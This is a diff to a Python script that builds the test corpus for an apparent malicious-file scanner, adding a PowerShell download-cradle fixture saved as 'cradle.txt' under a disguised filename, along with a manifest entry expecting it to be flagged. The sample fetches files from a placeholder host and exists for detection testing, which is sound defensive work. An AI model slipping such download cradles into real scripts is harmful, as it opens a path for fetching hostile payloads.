@@ -27,6 +27,9 @@ NATIVE_DIR   = os.path.join(CORPUS_DIR, 'native')
 PYSRC_DIR    = os.path.join(CORPUS_DIR, 'pysource')
 NOTEBOOK_DIR = os.path.join(CORPUS_DIR, 'notebook')
 DISGUISED_DIR = os.path.join(CORPUS_DIR, 'disguised')
+# Separate from DISGUISED_DIR: the engine test there asserts exactly five
+# disguised scripts, and this case exists only to pin classifier scoring.
+DISGUISED_PAIR_DIR = os.path.join(CORPUS_DIR, 'disguised_pair')
 PDF_DIR    = os.path.join(CORPUS_DIR, 'pdf')
 OFFICE_DIR = os.path.join(CORPUS_DIR, 'office')
 SHELL_DIR  = os.path.join(CORPUS_DIR, 'shell')
@@ -45,6 +48,7 @@ os.makedirs(NATIVE_DIR, exist_ok=True)
 os.makedirs(PYSRC_DIR, exist_ok=True)
 os.makedirs(NOTEBOOK_DIR, exist_ok=True)
 os.makedirs(DISGUISED_DIR, exist_ok=True)
+os.makedirs(DISGUISED_PAIR_DIR, exist_ok=True)
 os.makedirs(PDF_DIR, exist_ok=True)
 os.makedirs(OFFICE_DIR, exist_ok=True)
 os.makedirs(SHELL_DIR, exist_ok=True)
@@ -542,6 +546,17 @@ write_text(os.path.join(DISGUISED_DIR, 'notes2.txt'),
     "set TARGET=%USERPROFILE%\n"
     "goto end\n"
     ":end\n")
+
+# Minimal disguised cradle whose ONLY PowerShell signals are two different
+# download methods (same PS-DOWNLOAD rule, distinct tokens). Deliberately no
+# generic signature (no param block, no listed Verb-Noun cmdlet, no [System.*]),
+# so classification rests entirely on the hashed indicators. Scoring each rule
+# once (by TestID) left this at 1 -> 'unsupported'; each distinct token must
+# count, as the per-pattern signatures did before (PR #50 review).
+write_text(os.path.join(DISGUISED_PAIR_DIR, 'cradle.txt'),
+    "$c = [Net.WebClient]::new()\n"
+    "$page = $c.DownloadString('http://example.test/a')\n"
+    "$c.DownloadFile('http://example.test/b', 'b.bin')\n")
 
 # Negative control — plain English prose, must NOT be flagged disguised
 write_text(os.path.join(DISGUISED_DIR, 'memo.txt'),
@@ -1392,6 +1407,7 @@ manifest = {
         "disguised/data.dat":    {"expectFinding": "MTS-DISGUISE-002", "detectedType": "python"},
         "disguised/notes2.txt":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "batch"},
         "disguised/memo.txt":    {"expectNoDisguise": True},
+        "disguised_pair/cradle.txt": {"expectFinding": "MTS-DISGUISE-002", "detectedType": "powershell"},
         "pdf/pdf_clean.pdf":      {"expectActiveContent": False},
         "pdf/pdf_js.pdf":         {"expectFinding": "PDF-JAVASCRIPT"},
         "pdf/pdf_launch.pdf":     {"expectFinding": "PDF-LAUNCH"},
